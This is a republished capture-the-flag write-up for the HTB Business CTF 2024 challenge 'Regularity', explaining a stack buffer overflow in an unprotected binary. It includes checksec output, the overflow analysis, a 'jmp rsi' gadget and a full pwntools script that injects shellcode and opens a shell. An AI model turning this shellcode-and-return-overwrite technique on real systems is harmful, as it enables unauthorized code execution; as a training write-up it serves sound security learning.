# :game_die: HTB: Business CTF 2024 - Regularity

> **Original Source:** [HTB: Business CTF 2024 - Regularity](https://infosecwriteups.com/htb-business-ctf-2024-regularity-9c9bd848801b)
> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2024

---

# HTB: Business CTF 2024 — Regularity


Difficulty: Very Easy

## Description


Nothing much changes from day to day. Famine, conflict, hatred — it’s all part and parcel of the lives we live now. We’ve grown used to the animosity that we experience every day, and that’s why it’s so nice to have a useful program that asks how I’m doing. It’s not the most talkative, though, but it’s the highest level of tech most of us will ever see…

## Protection (checksec)


```
$ checksec
Arch: amd64-64-little
RELRO: No RELRO
Stack: No canary found
NX: NX unknown - GNU_STACK missing
PIE: No PIE (0x400000)
Stack: Executable
RWX: Has RWX segments
```


As we can see: there are no protections.


```
$ ldd regularity
not a dynamic executable
```


## The program’s interface


```
Hello, Survivor. Anything new these days?
nope
Yup, same old same old here as well...
```


## Disassembly (cutter)


*entry0 methodloc_read methodloc_write method*


We can notice in the read method, we created a `0x100` bytes buffer on the stack where we can read data. For some reasons we read `0x110` bytes of data. So there is a slight buffer overflow. This is enough to overwrite the return address of the read method.


## Get Szigecsán Dávid’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Because of NX is not enabled we can write shell code on the stack and overwrite the return address to reach the stack. We don’t know where the stack is, so we need a useful assembly gadget to jump there. In the main (entry0) we can see the read gets the address for read inside `rsi`. So the stack address is stored there. We can find a `jmp rsi` gadget at `0x401041`.

## Solution (pwntools)


```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'regularity')

# context.log_level = "INFO"
context(terminal=['tmux', 'split-window', '-h'])

host = args.HOST or '10.10.10.10'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, kw):
if args.GDB:
return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, kw)
else:
return process([exe.path] + argv, *a, kw)


def start_remote(argv=[], *a, kw):
io = connect(host, port)
if args.GDB:
gdb.attach(io, gdbscript=gdbscript)
return io


def start(argv=[], *a, kw):
if args.REMOTE:
return start_remote(argv, *a, kw)
else:
return start_local(argv, *a, kw)


gdbscript = '''
'''.format(locals())

#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: No RELRO
# Stack: No canary found
# NX: NX unknown - GNU_STACK missing
# PIE: No PIE (0x400000)
# Stack: Executable
# RWX: Has RWX segments

io = start()

# jmp_rsi = p64(0x401041)
jmp_rsi = next(exe.search(asm('jmp rsi')))
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (256 - len(shellcode)) + p64(jmp_rsi)

io.send(payload)

io.clean()
io.sendline(b'cat flag.txt')
warning('Flag: ' + io.recv().decode('utf-8'))

io.interactive()
```


## Skills Learned


- buffer overflow

- ret2reg

- shell coding

---

*Originally published on [Medium](https://infosecwriteups.com/htb-business-ctf-2024-regularity-9c9bd848801b). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
